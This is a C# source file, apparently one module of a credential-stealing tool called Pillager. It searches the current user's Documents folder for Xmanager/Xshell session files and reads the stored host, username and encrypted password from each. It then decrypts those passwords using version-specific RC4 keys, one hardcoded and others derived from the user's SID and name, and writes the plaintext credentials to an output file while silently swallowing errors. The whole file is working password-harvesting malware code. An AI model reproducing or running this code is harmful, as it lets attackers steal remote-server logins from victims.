using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;
using Pillager.Helper;

namespace Pillager.Tools
{
    internal class Xmanager : ICommand
    {
        public List<string> sessionFiles = new List<string>();

        public void GetAllAccessibleFiles(string rootPath)
        {
            DirectoryInfo di = new DirectoryInfo(rootPath);
            var dirs = di.GetDirectories();
            foreach (DirectoryInfo dir in dirs)
            {
                try
                {
                    GetAllAccessibleFiles(dir.FullName);
                }
                catch { }
            }
            var files = Directory.GetFiles(rootPath);
            foreach (string file in files)
            {
                if (file.Contains(".xsh")|| file.Contains(".xfp")) sessionFiles.Add(file);
            }
        }

        public string DecryptSessions()
        {
            StringBuilder sb = new StringBuilder();
            WindowsIdentity currentUser = WindowsIdentity.GetCurrent();
            string sid = currentUser.User.ToString();
            string userName = currentUser.Name.Split('\\')[1];

            foreach (string sessionFile in sessionFiles)
            {
                List<string> configs = ReadConfigFile(sessionFile);
                if (configs.Count < 4) continue;
                sb.AppendLine("Session File: " + sessionFile);
                sb.Append("Version: " + configs[0]);
                sb.Append("Host: " + configs[1]);
                sb.Append("UserName: " + configs[2]);
                sb.Append("rawPass: " + configs[3]);
                sb.AppendLine("UserName: " + userName);
                sb.AppendLine("Sid: " + sid);
                sb.AppendLine(Decrypt(userName, sid, configs[3], configs[0].Replace("\r", "")));
                sb.AppendLine();
            }

            return sb.ToString();
        }

        List<string> ReadConfigFile(string path)
        {
            string fileData = File.ReadAllText(path);
            string Version = null;
            string Host = null;
            //string Port = null;
            string Username = null;
            string Password = null;
            List<string> resultString = new List<string>();

            try
            {
                Version = Regex.Match(fileData, "Version=(.*)", RegexOptions.Multiline).Groups[1].Value;
                Host = Regex.Match(fileData, "Host=(.*)", RegexOptions.Multiline).Groups[1].Value;
                Username = Regex.Match(fileData, "UserName=(.*)", RegexOptions.Multiline).Groups[1].Value;
                Password = Regex.Match(fileData, "Password=(.*)", RegexOptions.Multiline).Groups[1].Value;
            }
            catch
            { }
            resultString.Add(Version);
            resultString.Add(Host);
            resultString.Add(Username);
            if (Password.Length > 3)
            {
                resultString.Add(Password);
            }


            return resultString;
        }

        string Decrypt(string username, string sid, string rawPass, string ver)
        {
            if (ver.StartsWith("5.0") || ver.StartsWith("4") || ver.StartsWith("3") || ver.StartsWith("2"))
            {
                byte[] data = Convert.FromBase64String(rawPass);

                byte[] Key = new SHA256Managed().ComputeHash(Encoding.ASCII.GetBytes("!X@s#h$e%l^l&"));

                byte[] passData = new byte[data.Length - 0x20];
                Array.Copy(data, 0, passData, 0, data.Length - 0x20);

                byte[] decrypted = RC4Crypt.Decrypt(Key, passData);

                return("Decrypt rawPass: " + Encoding.ASCII.GetString(decrypted));
            }

            if (ver.StartsWith("5.1") || ver.StartsWith("5.2"))
            {
                byte[] data = Convert.FromBase64String(rawPass);

                byte[] Key = new SHA256Managed().ComputeHash(Encoding.ASCII.GetBytes(sid));

                byte[] passData = new byte[data.Length - 0x20];
                Array.Copy(data, 0, passData, 0, data.Length - 0x20);

                byte[] decrypted = RC4Crypt.Decrypt(Key, passData);

                return ("Decrypt rawPass: " + Encoding.ASCII.GetString(decrypted));
            }

            if (ver.StartsWith("5") || ver.StartsWith("6") || ver.StartsWith("7.0"))
            {
                byte[] data = Convert.FromBase64String(rawPass);

                byte[] Key = new SHA256Managed().ComputeHash(Encoding.ASCII.GetBytes(username + sid));

                byte[] passData = new byte[data.Length - 0x20];
                Array.Copy(data, 0, passData, 0, data.Length - 0x20);

                byte[] decrypted = RC4Crypt.Decrypt(Key, passData);

                return ("Decrypt rawPass: " + Encoding.ASCII.GetString(decrypted));
            }

            if (ver.StartsWith("7"))
            {
                string strkey1 = new string(username.ToCharArray().Reverse().ToArray()) + sid;
                string strkey2 = new string(strkey1.ToCharArray().Reverse().ToArray());

                byte[] data = Convert.FromBase64String(rawPass);

                byte[] Key = new SHA256Managed().ComputeHash(Encoding.ASCII.GetBytes(strkey2));

                byte[] passData = new byte[data.Length - 0x20];
                Array.Copy(data, 0, passData, 0, data.Length - 0x20);

                byte[] decrypted = RC4Crypt.Decrypt(Key, passData);

                return ("Decrypt rawPass: " + Encoding.ASCII.GetString(decrypted));
            }
            return "";
        }

        public override void Save(string path)
        {
            try
            {
                GetAllAccessibleFiles(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments));
                if (sessionFiles.Count == 0) return;
                string savepath = Path.Combine(path, "Xmanager");
                Directory.CreateDirectory(savepath);
                string output = DecryptSessions();
                if (!string.IsNullOrEmpty(output)) File.WriteAllText(Path.Combine(savepath, "Xmanager.txt"), output, Encoding.UTF8);
            }
            catch { }
        }
    }
}
